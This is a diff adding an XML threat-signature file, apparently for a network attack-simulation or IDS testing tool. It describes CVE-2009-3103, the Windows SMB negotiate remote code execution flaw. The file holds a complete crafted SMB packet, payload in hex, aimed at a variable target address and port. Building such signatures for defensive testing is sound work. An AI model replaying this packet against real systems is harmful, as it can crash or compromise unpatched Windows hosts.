@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Windows SMB Negotiate Request Remote Code Execution"/>
+    <EngDesc display="true" value="A vulnerability has been reported in Microsoft Server Message Block (SMB) driver that could allow remote attackers to execute arbitrary code on the vulnerable system due to memory corruption. The vulnerability is due to incorrectly indexing an array when handling specially crafted SMB packets. Remote attackers could exploit this vulnerability by sending a specially crafted network message to a computer running the Server service. Successful exploitation would allow for arbitrary code injection and execution with the privileges of the operating system kernel (Ring 0). Code injection that does not result in execution could crash the target system, and result in a Denial of Service condition."/>
+    <Intent display="true">
+      <item value="Code_Execution/Index_Boundary_Error"/>
+    </Intent>
+    <Protocol display="true" value="SMB"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_Vista&amp;Server_2008"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-3103"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="534da72c812b65adfc5997df2bdf04a0"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633965580244679368"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1260873025" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="SMBdestPort" type="ImperfectControls.Port" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="G"/>
+      <for index="H"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:9F:0E:BA" destMac="00:0C:29:A5:EE:E2" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0113" Identification="3C90" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="943D" srcIP="172.16.8.154" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="56988" destPort="$SMBdestPort" SeqNumber="8096E725" AckNumber="14886185" HeaderLength="08" WindowSize="016D" Checksum="8895" UrgentPointer="0000" Options="0101080A0005DBB10000428D" Payload="000000DBFF534D4272000000000843C8001000000000000000000000000000000000010000B800025043204E4554574F524B2050524F4752414D20312E3000024D4943524F534F4654204E4554574F524B5320312E303300024D4943524F534F4654204E4554574F524B5320332E3000024C414E4D414E312E30000257696E646F777320666F7220576F726B67726F75707320332E316100024C4D312E32583030320002444F53204C414E4D414E322E310002534D4220322E303032000253616D626100024E54204C414E4D414E20312E3000024E54204C4D20302E313200" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
